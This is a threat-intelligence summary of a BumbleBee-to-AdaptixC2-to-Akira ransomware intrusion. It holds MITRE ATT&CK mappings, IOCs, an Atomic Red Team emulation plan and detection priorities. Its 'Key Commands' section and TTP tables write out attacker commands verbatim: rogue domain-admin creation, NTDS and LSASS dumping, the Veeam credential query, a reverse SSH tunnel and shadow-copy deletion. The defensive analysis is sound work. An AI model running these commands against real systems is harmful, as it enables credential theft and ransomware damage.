---
source_url: https://thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/
extraction_date: 2026-08-03
report_publisher: The DFIR Report
report_date: 2026-06-29
campaign: BumbleBee SEO Poisoning → AdaptixC2 → Akira Ransomware
---

# Threat Intel: From Bing Search to Ransomware — BumbleBee & AdaptixC2 Deliver Akira

## Threat Overview

| Field | Detail |
| --- | --- |
| Campaign | SEO-poisoning (malvertising via Bing) delivering trojanized IT-tool installers |
| Malware / tooling | **BumbleBee** (loader) → **AdaptixC2** (post-exploitation) → **Akira** (ransomware); RustDesk, FileZilla, SoftPerfect Network Scanner, lsassy, Cloudflare Tunnel, reverse SSH |
| Threat actor | Akira ransomware affiliate (unnamed) |
| Targeting | Enterprise with multi-domain Active Directory; lure aimed at IT staff / sysadmins searching for admin tools (ManageEngine OpManager, Zenmap/Nmap, IP scanners) |
| Time period | Campaign observed May–Aug 2025; this intrusion confirmed Jul–Aug 2025 |
| Dwell time | **~44 hours** from initial access to first encryption; child domain encrypted **~2 days later** |
| Exfiltration | ~79.5 GB total (≈77 GB via FileZilla SFTP + ~2.5 GB SYSVOL via SSH tunnel) |

**Attack chain:** Bing search → lookalike site (`opmanager[.]pro`) → gateway (`download-center[.]online`) → trojanized MSI → DLL side-loading of BumbleBee → AdaptixC2 injection → domain admin abuse → NTDS/Veeam/LSASS credential theft → RDP + reverse-SSH lateral movement → SFTP exfiltration → Akira encryption + shadow-copy deletion.

---

## TTPs (MITRE ATT&CK)

### Initial Access
| Technique | ID | Use in campaign | Confidence |
| --- | --- | --- | --- |
| Drive-by Compromise | [T1189](https://attack.mitre.org/techniques/T1189/) | SEO/Bing poisoning redirected a "ManageEngine OpManager" search to lookalike `opmanager[.]pro` → gateway `download-center[.]online` serving a trojanized MSI | High |
| User Execution: Malicious File | [T1204.002](https://attack.mitre.org/techniques/T1204/002/) | IT admin moved `ManageEngine-OpManager.msi` to a share and ran it with elevated privileges | High |

### Execution
| Technique | ID | Use in campaign | Confidence |
| --- | --- | --- | --- |
| DLL Side-Loading | [T1574.001](https://attack.mitre.org/techniques/T1574/001/) | MSI dropped legit `consent.exe` + decoy OpManager EXE + malicious `msimg32.dll` to `%TEMP%\ApplicationInstallationFolder_11`; `consent.exe` loaded the local (malicious) `msimg32.dll` | High |
| Windows Management Instrumentation | [T1047](https://attack.mitre.org/techniques/T1047/) | `AdgNsy.exe` (AdaptixC2) spawned under `WmiPrvSE.exe`; later WMIC used for remote exec | High |
| Command & Scripting: PowerShell | [T1059.001](https://attack.mitre.org/techniques/T1059/001/) | Encoded PowerShell for Veeam cred decrypt; AD enumeration; shadow-copy deletion | High |

### Persistence
| Technique | ID | Use in campaign | Confidence |
| --- | --- | --- | --- |
| Create Account: Domain | [T1136.002](https://attack.mitre.org/techniques/T1136/002/) | `net user backup_DA P@ssw0rd1234 /add /dom`; `net user backup_EA P@ssw0rd1234 /add /dom` | High |
| Account Manipulation | [T1098](https://attack.mitre.org/techniques/T1098/) | Reset built-in `administrator` password (`net user administrator P@ssw0rd!`); reactivated disabled DA | High |
| Remote Access Software | [T1219](https://attack.mitre.org/techniques/T1219/) | RustDesk installed as service (`RustDesk.exe --tray`) on multiple servers | High |
| Create/Modify System Process: Service | [T1543.003](https://attack.mitre.org/techniques/T1543/003/) | RustDesk + (Swisscom variant) Cloudflare tunnel registered as Windows services | High |

### Privilege Escalation
| Technique | ID | Use in campaign | Confidence |
| --- | --- | --- | --- |
| Domain Groups membership add | [T1098](https://attack.mitre.org/techniques/T1098/) / [T1069.002](https://attack.mitre.org/techniques/T1069/002/) | `net group "enterprise admins" backup_EA /add /dom` | High |

> Note: Little classic priv-esc — the initially compromised admin already ran the MSI elevated, so the actor operated with domain-admin context almost immediately.

### Defense Evasion
| Technique | ID | Use in campaign | Confidence |
| --- | --- | --- | --- |
| Masquerading | [T1036](https://attack.mitre.org/techniques/T1036/) | `AdgNsy.exe` = renamed `WAB.exe`; LSASS dumps saved with fake `.docx`/`.avhdx`/`.sys` extensions | High |
| Process Injection | [T1055](https://attack.mitre.org/techniques/T1055/) | Reflective injection of Adaptix shellcode into `AdgNsy.exe`; PE-sieve found `hasherezade_pussy.dll`, RWX regions, unbacked thread entry | High |
| Command Obfuscation | [T1027.010](https://attack.mitre.org/techniques/T1027/010/) | Mixed-case commands (`CmD.eXe`, `pOWerShELl.exE`) | Medium |
| Indicator Removal: File Deletion | [T1070.004](https://attack.mitre.org/techniques/T1070/004/) | Loaders/recon logs securely deleted (Sysmon EID 23); FileZilla uninstalled pre-encryption | High |
| BYOVD (variant) | [T1068](https://attack.mitre.org/techniques/T1068/) | Swisscom variant dropped `rwdrv.sys` (svc `mgdsrv`) + `hlpdrv.sys` (svc `KMHLPSVC`) as AV-killer | Medium |

### Credential Access
| Technique | ID | Use in campaign | Confidence |
| --- | --- | --- | --- |
| OS Cred Dumping: NTDS | [T1003.003](https://attack.mitre.org/techniques/T1003/003/) | `wbadmin start backup` of `ntds.dit` + SYSTEM/SECURITY hives to `\\127.0.0.1\C$\ProgramData\` | High |
| OS Cred Dumping: LSASS | [T1003.001](https://attack.mitre.org/techniques/T1003/001/) | `lsassy` across 3 hosts via SMB/WMI/scheduled-task/DCOM; `rundll32 comsvcs.dll,#+000024 <PID> ... full` | High |
| Credentials from Password Stores | [T1555](https://attack.mitre.org/techniques/T1555/) | Veeam: `psql.exe ... SELECT user_name,password ... FROM credentials`; DPAPI decrypt with hardcoded salt | High |
| Credentials from Password Stores: Browsers | [T1555.003](https://attack.mitre.org/techniques/T1555/003/) | Share-scan targeted Chrome/Edge/Brave/Firefox user-data dirs | Medium |

### Discovery
| Technique | ID | Use in campaign | Confidence |
| --- | --- | --- | --- |
| System Information Discovery | [T1082](https://attack.mitre.org/techniques/T1082/) | `systeminfo` | High |
| Remote System Discovery | [T1018](https://attack.mitre.org/techniques/T1018/) | SoftPerfect `n.exe`; `Invoke-ShareFinder`; SPN → IP resolution to `spn.txt` | High |
| Account Discovery: Domain | [T1087.002](https://attack.mitre.org/techniques/T1087/002/) | `net user administrator`, `net group domain admins /dom`, `Get-ADUser`, `Get-ADComputer` → CSV | High |
| Permission Groups: Domain | [T1069.002](https://attack.mitre.org/techniques/T1069/002/) | `whoami /groups`, `net group` queries | High |
| Domain Trust Discovery | [T1482](https://attack.mitre.org/techniques/T1482/) | `nltest /domain_trusts`, `nltest /dclist:` | High |
| Network Share Discovery | [T1135](https://attack.mitre.org/techniques/T1135/) | `Invoke-ShareFinder -CheckShareAccess` → `shares.txt` | High |
| System Owner/User Discovery | [T1033](https://attack.mitre.org/techniques/T1033/) | `quser /server:<domain>` | High |

### Lateral Movement
| Technique | ID | Use in campaign | Confidence |
| --- | --- | --- | --- |
| Remote Desktop Protocol | [T1021.001](https://attack.mitre.org/techniques/T1021/001/) | RDP with `backup_EA` across DC, file, backup, and child-domain servers; rotated ~9 accounts | High |
| Proxy / Tunneling | [T1090](https://attack.mitre.org/techniques/T1090/) | Reverse SSH `ssh user@<IP>.150 -R *:10400 -p22` bridging RDP; Cloudflare tunnel (variant) | High |

### Collection
| Technique | ID | Use in campaign | Confidence |
| --- | --- | --- | --- |
| Data from Network Shared Drive | [T1039](https://attack.mitre.org/techniques/T1039/) | SMB EID 5145 shows systematic scan of DPAPI, cred manager, browser, cloud (AWS/GCP/Azure), password-manager, mRemoteNG, source-repo paths; SYSVOL (~2.5 GB) | High |

### Command & Control
| Technique | ID | Use in campaign | Confidence |
| --- | --- | --- | --- |
| Web Protocols | [T1071.001](https://attack.mitre.org/techniques/T1071/001/) | BumbleBee HTTPS:443 C2; AdaptixC2 HTTP beacon to `172.96.137[.]160` | High |
| Domain Generation Algorithm | [T1568.002](https://attack.mitre.org/techniques/T1568/002/) | BumbleBee 14-char `.org` DGA domains | High |
| Remote Access Software | [T1219](https://attack.mitre.org/techniques/T1219/) | RustDesk interactive sessions (Type 2 from 127.0.0.1) | High |

### Exfiltration
| Technique | ID | Use in campaign | Confidence |
| --- | --- | --- | --- |
| Exfil Over Alt Protocol: Symmetric Encrypted | [T1048.001](https://attack.mitre.org/techniques/T1048/001/) | FileZilla 3.68.1 SFTP to `185.174.100[.]203:22` (user `Stark`), 2 sessions ≈39 GB + 42 GB; SYSVOL over SSH tunnel to `193.242.184[.]150:22` | High |
| Automated Exfiltration | [T1020](https://attack.mitre.org/techniques/T1020/) | Bulk share collection then SFTP transfer | Medium |

### Impact
| Technique | ID | Use in campaign | Confidence |
| --- | --- | --- | --- |
| Data Encrypted for Impact | [T1486](https://attack.mitre.org/techniques/T1486/) | `locker.exe -p=G:\ -n=15` (partial 15% encryption); remote exec against shares; child DC run 39×; variant `win.exe -n=2 netonly` | High |
| Inhibit System Recovery | [T1490](https://attack.mitre.org/techniques/T1490/) | `powershell -Command "Get-WmiObject Win32_Shadowcopy | Remove-WmiObject"` within ~1s of each locker run | High |
| Service Stop (variant) | [T1489](https://attack.mitre.org/techniques/T1489/) | WMIC disabled/killed SQL & IIS services pre-encryption | Medium |

---

## Indicators of Compromise

### Domains
```
opmanager[.]pro            zenmap[.]pro              ip-scanner[.]org
download-center[.]online   soft-hub[.]pro            download-server[.]online
soft-server[.]online       netml[.]shop             shopping5[.]shop
```
**BumbleBee DGA (.org, 14-char):**
```
ev2sirbd269o5j[.]org  2rxyt9urhq0bgj[.]org  d1hmxkpwby0d4s[.]org  yj6jurm5qqkye5[.]org
ewujsfb1dp5ran[.]org  8doj8uvx604eck[.]org  kwywztxoo2xdot[.]org  ky1d1p1daahe5t[.]org
ovh1kn1tcqw5kp[.]org  6cimu4mc085em8[.]org  5ka8rxp6t6eup2[.]org  ks501oz9nm3v05[.]org
v5rjsdqogstopr[.]org
```

### IP Addresses
| IP | Role |
| --- | --- |
| 188.40.187[.]145 | BumbleBee C2 :443 |
| 109.205.195[.]211 | BumbleBee C2 :443 / payload delivery |
| 171.22.183[.]43 | BumbleBee C2 |
| 194.127.178[.]21 | BumbleBee C2 |
| 192.121.22[.]94 | BumbleBee C2 |
| 172.96.137[.]160 | AdaptixC2 beacon (Shock Hosting) |
| 170.130.55[.]223 | AdaptixC2 beacon (Swisscom variant) |
| 193.242.184[.]150 | Reverse SSH tunnel / SYSVOL exfil :22 |
| 185.174.100[.]203 | FileZilla SFTP exfil :22 (UA, AS-COLOCROSSING) |
| 84.32.84[.]32 | Staging gateway IP (Hostinger AS47583) |
| 4.239.95[.]1:8080 | Hardcoded C2, Ivanti VPN cred-stealer variant |

### File Hashes
| File | Type | Hash |
| --- | --- | --- |
| ManageEngine-OpManager.msi | MD5 | `124a48b78060fa851e1cc077ca35713c` |
| | SHA1 | `ab82bf27132323861810c0efcac6d5dd01600dd4` |
| | SHA256 | `186b26df63df3b7334043b47659cba4185c948629d857d47452cc1936f0aa5da` |
| msimg32.dll (BumbleBee) | MD5 | `ca8646dfc88423bb9fffda811160cebe` |
| | SHA1 | `febbaf5f08a8e0782ffcce8beef1f2b4e249a52b` |
| | SHA256 | `a6df0b49a5ef9ffd6513bfe061fb60f6d2941a440038e2de8a7aeb1914945331` |
| locker.exe (Akira) | MD5 | `8c113b3aa82c81eee7c6b4ed0ba9a90f` |
| | SHA1 | `d66944e1a57daf04d3e809f22cd01946d593acaf` |
| | SHA256 | `de730d969854c3697fd0e0803826b4222f3a14efe47e4c60ed749fff6edce19d` |

### File Paths / Filenames
```
%TEMP%\ApplicationInstallationFolder_11\ManageEngine_OpManager_64bit.exe   (decoy)
%TEMP%\ApplicationInstallationFolder_11\consent.exe                        (legit UAC bin, hijacked)
%TEMP%\ApplicationInstallationFolder_11\msimg32.dll                        (BumbleBee loader)
C:\Users\<user>\AppData\Local\AdgNsy.exe                                    (AdaptixC2, renamed WAB.exe)
C:\Program Files\RustDesk\RustDesk.exe                                      (persistence, --tray)
C:\ProgramData\FileZilla_3.68.1_win64_sponsored2-setup.exe
C:\ProgramData\locker.exe                                                   (Akira)
C:\ProgramData\win.exe                                                      (Akira, Swisscom variant)
C:\ProgramData\av_kill_new\icardagt\icardagt.exe                           (BYOVD AV-killer, variant)
C:\ProgramData\av_kill_old\mfpmp\mfpmp.exe                                  (BYOVD AV-killer, variant)
%TEMP%\rwdrv.sys                                                            (vuln driver, svc mgdsrv)
%TEMP%\hlpdrv.sys                                                           (vuln driver, svc KMHLPSVC)
C:\programdata\shares.txt   C:\programdata\spn.txt
C:\ProgramData\AdComputers.csv   C:\ProgramData\AdUsers.csv
\Windows\Temp\G7wO.sys   \Windows\Temp\U8Vfsh.docx   \Windows\Temp\AsaZQZDJz.avhdx   (LSASS dumps)
n.exe   (SoftPerfect Network Scanner)
```

### Accounts / Services
```
backup_DA  (P@ssw0rd1234, domain)          backup_EA  (P@ssw0rd1234, Enterprise Admins)
Service: RustDesk   Service: mgdsrv (rwdrv.sys)   Service: KMHLPSVC (hlpdrv.sys)
```

### Key Commands
```powershell
net user backup_EA P@ssw0rd1234 /add /dom
net group "enterprise admins" backup_EA /add /dom
wbadmin start backup -backuptarget:\\127.0.0.1\C$\ProgramData\ -include:C:\windows\NTDS\ntds.dit,C:\windows\system32\config\SYSTEM,C:\windows\system32\config\SECURITY -quiet
psql.exe -U postgres --csv -d VeeamBackup -w -c "SELECT user_name,password,description,change_time_utc FROM credentials"
rundll32.exe C:\windows\System32\comsvcs.dll, #+000024 <PID> \Windows\Temp\<random>.<ext> full
ssh user@<IP>.150 -R *:10400 -p22
locker.exe -p=G:\ -n=15
powershell.exe -Command "Get-WmiObject Win32_Shadowcopy | Remove-WmiObject"
```

### Code-signing certs (revoked / suspicious)
`LLC Resource+`, `LLC Ugurmana`, `LLC Leighton`, `LLC Vector`, `LLC Ellada Comfort`, `LLC Best Consult`; Ivanti variant `Hefei Qiangwei Network Technology`.

---

## Simulation Plan (Atomic Red Team)

Prioritized: **high-confidence TTPs with available atomics first.** Run in an isolated lab; each `Invoke-AtomicTest` needs the test number that matches the procedure.

### Tier 1 — high confidence + atomics available
| # | Technique | Atomic tests | Maps to |
| --- | --- | --- | --- |
| 1 | T1136.002 Create Domain Account | `Invoke-AtomicTest T1136.002` (Create new Domain Account via net.exe / PowerShell) | `net user backup_EA ... /add /dom` |
| 2 | T1098 Account Manipulation | `Invoke-AtomicTest T1098` (add member to Domain Admins / reset password) | `net group "enterprise admins" ... /add` |
| 3 | T1003.003 NTDS via wbadmin | `Invoke-AtomicTest T1003.003` (Create Volume Shadow Copy / dump NTDS.dit; wbadmin variant) | `wbadmin start backup ... ntds.dit` |
| 4 | T1003.001 LSASS Dump | `Invoke-AtomicTest T1003.001` (comsvcs.dll MiniDump — Test #1) | `rundll32 comsvcs.dll,#+000024` |
| 5 | T1490 Inhibit Recovery | `Invoke-AtomicTest T1490` (delete VSS via WMI/vssadmin — the Get-WmiObject Win32_Shadowcopy test) | shadow-copy deletion |
| 6 | T1218/T1574.001 DLL Side-Load | `Invoke-AtomicTest T1574.001` (side-load via signed binary) | `consent.exe` + `msimg32.dll` |
| 7 | T1021.001 RDP | `Invoke-AtomicTest T1021.001` (RDP session; enable RDP) | lateral movement |
| 8 | T1082 System Info | `Invoke-AtomicTest T1082` (systeminfo) | `systeminfo` |
| 9 | T1018 Remote System Discovery | `Invoke-AtomicTest T1018` (nltest /dclist, net view) | `nltest /dclist:` |
| 10 | T1482 Domain Trust Discovery | `Invoke-AtomicTest T1482` (nltest /domain_trusts) | `nltest /domain_trusts` |
| 11 | T1087.002 Domain Account Disc. | `Invoke-AtomicTest T1087.002` (net group domain admins; Get-ADUser) | AD enumeration |
| 12 | T1135 Network Share Discovery | `Invoke-AtomicTest T1135` (net view shares; PowerView ShareFinder) | `Invoke-ShareFinder` |
| 13 | T1219 Remote Access Software | `Invoke-AtomicTest T1219` (install RustDesk/AnyDesk) | RustDesk service |
| 14 | T1048.001 Encrypted Exfil | `Invoke-AtomicTest T1048.001` (exfil over SSH/SFTP) | FileZilla SFTP |
| 15 | T1486 Data Encrypted | `Invoke-AtomicTest T1486` (encrypt files in-place) | `locker.exe -p= -n=` |
| 16 | T1071.001 Web C2 | `Invoke-AtomicTest T1071.001` (HTTP/S C2 beacon simulation) | BumbleBee/Adaptix |
| 17 | T1489 Service Stop | `Invoke-AtomicTest T1489` (stop/disable services via WMIC/sc) | WMIC SQL/IIS disable |
| 18 | T1070.004 File Deletion | `Invoke-AtomicTest T1070.004` (secure delete / del) | loader cleanup |

### Tier 2 — high confidence, partial/adjacent atomic coverage
| Technique | Note |
| --- | --- |
| T1033 (`quser`) | Covered by generic user-discovery atomics; `quser /server:` may need custom test |
| T1055 Process Injection | Atomics exist (`Invoke-AtomicTest T1055`) but reflective/Adaptix shellcode chain must be emulated with a C2 (e.g., a lab Adaptix/Cobalt-strike beacon), not a single atomic |
| T1090 Proxy / reverse SSH | `T1090` atomics cover port-fwd; reverse-SSH `-R *:10400` needs a custom OpenSSH test |
| T1027.010 Command Obfuscation | Mixed-case exec — validate case-insensitive detection manually |

### Techniques with no clean atomic (emulate manually / with C2 or custom scripts)
- **T1189 SEO/Drive-by** — stand up a lure page + trojanized MSI in lab; not an atomic.
- **T1568.002 DGA (BumbleBee)** — generate 14-char `.org` DGA lookups with a script; validate DNS/NDR analytics.
- **T1555 Password Stores (Veeam `psql` cred query, DPAPI hardcoded-salt decrypt)** — build a custom `psql` SELECT + DPAPI test.
- **T1039 Bulk share collection** — script SMB traversal of the DPAPI/browser/cloud/password-manager paths (EID 5145 telemetry test).
- **BYOVD (variant)** — load `rwdrv.sys`/`hlpdrv.sys` as services in an isolated VM to validate driver-load / vuln-driver blocklist telemetry.

### Detection validation priorities
1. **DLL side-loading**: `consent.exe` loading a non-System32 `msimg32.dll` from `%TEMP%` (Sysmon EID 7).
2. **wbadmin NTDS backup** to a `\\127.0.0.1\C$` UNC target.
3. **comsvcs.dll MiniDump** via rundll32 with ordinal `#+000024`.
4. **Shadow-copy deletion** via `Get-WmiObject Win32_Shadowcopy | Remove-WmiObject` immediately after a new EXE in `C:\ProgramData`.
5. **Domain account creation + Enterprise Admins add** in a single short window.
6. **Reverse SSH** `-R *:10400` / OpenSSH outbound to an external :22.
7. **Mass SFTP egress** (tens of GB) to a single external host over :22.
